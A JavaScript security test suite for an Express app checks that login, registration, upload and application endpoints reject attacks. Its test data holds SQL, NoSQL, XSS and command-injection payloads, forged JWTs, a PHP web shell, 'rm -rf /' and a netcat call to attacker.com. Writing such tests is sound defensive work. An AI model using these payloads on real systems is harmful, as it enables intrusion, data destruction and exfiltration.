import request from 'supertest';
import { app } from '../server';
import jwt from 'jsonwebtoken';

describe('Security Penetration Testing Suite', () => {
  describe('Authentication Security Tests', () => {
    it('should prevent SQL injection in login attempts', async () => {
      const maliciousPayloads = [
        { email: "admin'; DROP TABLE users; --", password: 'password' },
        { email: "admin' OR '1'='1", password: 'password' },
        { email: "admin' UNION SELECT * FROM users --", password: 'password' },
        { email: "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'hacked'); --", password: 'password' }
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload);

        // Should not return 200 or expose database errors
        expect(response.status).not.toBe(200);
        expect(response.body.error).toBeDefined();
        expect(response.body.error.message).not.toContain('SQL');
        expect(response.body.error.message).not.toContain('database');
      }
    });

    it('should prevent XSS attacks in user input', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: 'test@example.com',
            password: 'password123',
            firstName: payload,
            lastName: 'User'
          });

        // Should sanitize input and not execute scripts
        if (response.status === 201) {
          expect(response.body.user.firstName).not.toContain('<script>');
          expect(response.body.user.firstName).not.toContain('javascript:');
          expect(response.body.user.firstName).not.toContain('onerror');
        }
      }
    });

    it('should prevent brute force attacks with rate limiting', async () => {
      const attempts = [];
      const maxAttempts = 10;

      // Attempt multiple failed logins rapidly
      for (let i = 0; i < maxAttempts; i++) {
        attempts.push(
          request(app)
            .post('/api/auth/login')
            .send({
              email: 'test@example.com',
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.all(attempts);
      
      // Should start rate limiting after several attempts
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent JWT token manipulation', async () => {
      const maliciousTokens = [
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
        'invalid.token.here',
        jwt.sign({ userId: 'admin', role: 'admin' }, 'wrong-secret'),
        'Bearer ' + Buffer.from('{"userId":"admin","role":"admin"}').toString('base64')
      ];

      for (const token of maliciousTokens) {
        const response = await request(app)
          .get('/api/applications')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
        expect(response.body.error).toBeDefined();
      }
    });
  });

  describe('Input Validation Security Tests', () => {
    it('should prevent NoSQL injection attacks', async () => {
      const noSQLPayloads = [
        { email: { $ne: null }, password: { $ne: null } },
        { email: { $regex: '.*' }, password: { $regex: '.*' } },
        { email: { $where: 'this.email' }, password: 'password' },
        { email: { $gt: '' }, password: { $gt: '' } }
      ];

      for (const payload of noSQLPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload);

        expect(response.status).not.toBe(200);
        expect(response.body.error).toBeDefined();
      }
    });

    it('should validate file upload security', async () => {
      const maliciousFiles = [
        { filename: '../../../etc/passwd', content: 'malicious content' },
        { filename: 'test.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: 'test.exe', content: 'MZ\x90\x00\x03\x00\x00\x00' },
        { filename: 'test.js', content: 'require("child_process").exec("rm -rf /");' }
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/upload')
          .attach('file', Buffer.from(file.content), file.filename);

        // Should reject malicious file types and paths
        expect(response.status).not.toBe(200);
      }
    });

    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test`whoami`',
        'test$(id)'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/applications')
          .send({
            legalName: payload,
            universities: ['harvard'],
            programType: 'graduate',
            applicationTerm: 'Fall 2026'
          });

        // Should sanitize input and not execute commands
        if (response.status === 201) {
          expect(response.body.application.legalName).not.toContain(';');
          expect(response.body.application.legalName).not.toContain('&&');
          expect(response.body.application.legalName).not.toContain('|');
        }
      }
    });
  });

  describe('Authorization Security Tests', () => {
    it('should prevent privilege escalation', async () => {
      // Create a regular user token
      const userToken = jwt.sign(
        { userId: 'user123', role: 'student' },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Try to access admin endpoints
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/system-config',
        '/api/admin/analytics',
        '/api/admin/backup'
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${userToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error.message).toContain('Insufficient permissions');
      }
    });

    it('should prevent horizontal privilege escalation', async () => {
      const user1Token = jwt.sign(
        { userId: 'user1', role: 'student' },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Try to access another user's data
      const response = await request(app)
        .get('/api/applications/user2-application-id')
        .set('Authorization', `Bearer ${user1Token}`);

      expect(response.status).toBe(403);
    });
  });

  describe('Data Exposure Security Tests', () => {
    it('should not expose sensitive information in error messages', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'nonexistent@example.com',
          password: 'wrongpassword'
        });

      expect(response.status).toBe(401);
      expect(response.body.error.message).not.toContain('password');
      expect(response.body.error.message).not.toContain('hash');
      expect(response.body.error.message).not.toContain('database');
      expect(response.body.error.message).not.toContain('SQL');
    });

    it('should not expose internal system information', async () => {
      const response = await request(app)
        .get('/api/nonexistent-endpoint');

      expect(response.status).toBe(404);
      expect(response.body.error).toBeDefined();
      expect(response.body.error.message).not.toContain('Express');
      expect(response.body.error.message).not.toContain('Node.js');
      expect(response.body.error.message).not.toContain('stack trace');
    });
  });

  describe('Session Security Tests', () => {
    it('should invalidate sessions on logout', async () => {
      // Login to get a token
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'test@example.com',
          password: 'testpassword123'
        });

      const token = loginResponse.body.token;

      // Logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${token}`);

      // Try to use the token after logout
      const response = await request(app)
        .get('/api/applications')
        .set('Authorization', `Bearer ${token}`);

      expect(response.status).toBe(401);
    });

    it('should handle concurrent session attacks', async () => {
      const token = jwt.sign(
        { userId: 'user123', role: 'student' },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Make multiple concurrent requests with the same token
      const promises = Array(50).fill(null).map(() =>
        request(app)
          .get('/api/applications')
          .set('Authorization', `Bearer ${token}`)
      );

      const responses = await Promise.all(promises);
      
      // All requests should be handled properly without session conflicts
      responses.forEach(response => {
        expect([200, 401, 403]).toContain(response.status);
      });
    });
  });

  describe('HTTPS and Transport Security Tests', () => {
    it('should enforce secure headers', async () => {
      const response = await request(app).get('/');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
    });

    it('should prevent clickjacking attacks', async () => {
      const response = await request(app).get('/');

      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['content-security-policy']).toContain("frame-ancestors 'none'");
    });
  });
});